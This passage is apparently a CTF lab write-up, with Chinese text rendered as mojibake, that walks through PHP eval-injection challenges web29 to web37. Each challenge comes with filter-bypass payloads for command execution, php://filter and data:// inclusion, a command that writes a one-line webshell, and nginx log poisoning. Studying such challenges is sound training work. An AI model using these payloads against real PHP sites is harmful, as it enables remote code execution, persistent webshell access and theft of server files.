</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚</p>
<p>è¿›è¡Œç»•è¿‡å°±è¡Œï¼Œè§£æ³•å¾ˆå¤š</p>
<blockquote>
<ol>
<li>
<p>c=system(&ldquo;cat fl*g.php | grep  -E &lsquo;fl.g&rsquo; &ldquo;);</p>
</li>
<li>
<p>c=system(&ldquo;tac fl*g.php&rdquo;);</p>
</li>
<li>
<p>c=system(&ldquo;cat fl*g.php&rdquo;);ï¼ˆç”¨catè¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°å›æ˜¾ï¼‰</p>
</li>
<li>
<p>c=system(&ldquo;cp fl*g.php a.txt &ldquo;);ï¼ˆè®¿é—®a.txtæŸ¥çœ‹ï¼‰</p>
</li>
<li>
<p>c=system(&rsquo;echo -e &quot; &lt;?php \n error_reporting(0); \n  $c= $_GET['c']; \n eval($c); &quot; &gt; a.php&rsquo;); //ç›´æ¥æ–°å»ºä¸€ä¸ªé¡µé¢å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬
ï¼ˆ/a.php?c=system(&ldquo;tac flag.php&rdquo;);ï¼‰</p>
</li>
<li>
<p>?c=echo `tac fla*`;</p>
<p>&hellip;.</p>
</li>
</ol></blockquote>
<h4 id="web30">web30<a hidden class="anchor" aria-hidden="true" href="#web30">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:42:26
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­—flagï¼Œsystemè¿˜æœ‰phpï¼Œç”±äºè¿‡æ»¤äº†systemæˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>payload:</p>
<blockquote>
<ol>
<li>
<p>c=printf(exec(&ldquo;cat%20fl*&rdquo;));</p>
</li>
<li>
<p>c=echo exec(&ldquo;cat f\lag.p\hp&rdquo;);</p>
</li>
<li>
<p>c=show_source(scandir(&rdquo;.&rdquo;)[2]); (è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•é¡¹çš„æ•°ç»„)</p>
</li>
<li>
<p>c=highlight_file(next(array_reverse(scandir(&rdquo;.&rdquo;))));</p>
</li>
<li>
<p>c=passthru(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=echo `tac fla*`;</p>
</li>
<li>
<p>c=$a=sys;$b=tem;$c=$a.$b;$c(&ldquo;tac fla*&rdquo;);*</p>
</li>
<li>
<p>c=echo shell_exec(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</p>
</li>
<li>
<p>c=passthru(base64_decode(&ldquo;Y2F0IGZsYWcucGhw==&rdquo;));(base64ç»•è¿‡)</p>
<p>&hellip;&hellip;</p>
</li>
</ol></blockquote>
<h4 id="web31">web31<a hidden class="anchor" aria-hidden="true" href="#web31">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'</p>
<p>payload:</p>
<blockquote>
<ol>
<li>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</li>
<li>c=show_source(scandir(getcwd())[2]);</li>
<li>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</li>
<li>c=passthru(&ldquo;tac%09fla*&rdquo;);</li>
<li>c=echo`tac%09fla*`;</li>
</ol></blockquote>
<h4 id="web32">web32<a hidden class="anchor" aria-hidden="true" href="#web32">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:56:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(</p>
<p><em>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨<code>${IFS}</code>å’Œ<code>%0a</code> ä»£æ›¿ï¼Œåˆ†å·å¯ä»¥ç”¨<code>?&gt;</code>ä»£æ›¿</em></p>
<p>ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<p>å¾—åˆ°çš„ç»“æœç”¨base64è§£ç ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>æˆ–è€…ç”¨æ—¥å¿—æ³¨å…¥ï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log
<code>/var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</code></p></blockquote>
<h4 id="web33">web33<a hidden class="anchor" aria-hidden="true" href="#web33">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 02:22:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½çš„å…³é”®è¯æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ªåŒå¼•å· /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|&quot;</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web34">web34<a hidden class="anchor" aria-hidden="true" href="#web34">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:29
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½çš„å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web35">web35<a hidden class="anchor" aria-hidden="true" href="#web35">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼šï¼ˆwsmè¿˜èƒ½ç§’ï¼‰</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web36">web36<a hidden class="anchor" aria-hidden="true" href="#web36">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-04 04:21:16
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=|\/|[0-9]/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®å­— /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=|/|[0-9]</p>
<p>ä¸æ˜¯å“¥ä»¬ï¼Œæ•°å­—ä¹Ÿè¦å±è”½ï¼Œé‚£æˆ‘æ”¹ä¸€ä¸‹ä¸å°±å¥½äº†</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[m]?&gt;&amp;m=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[m]?&gt;&amp;m=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web37">web37<a hidden class="anchor" aria-hidden="true" href="#web37">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:18:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
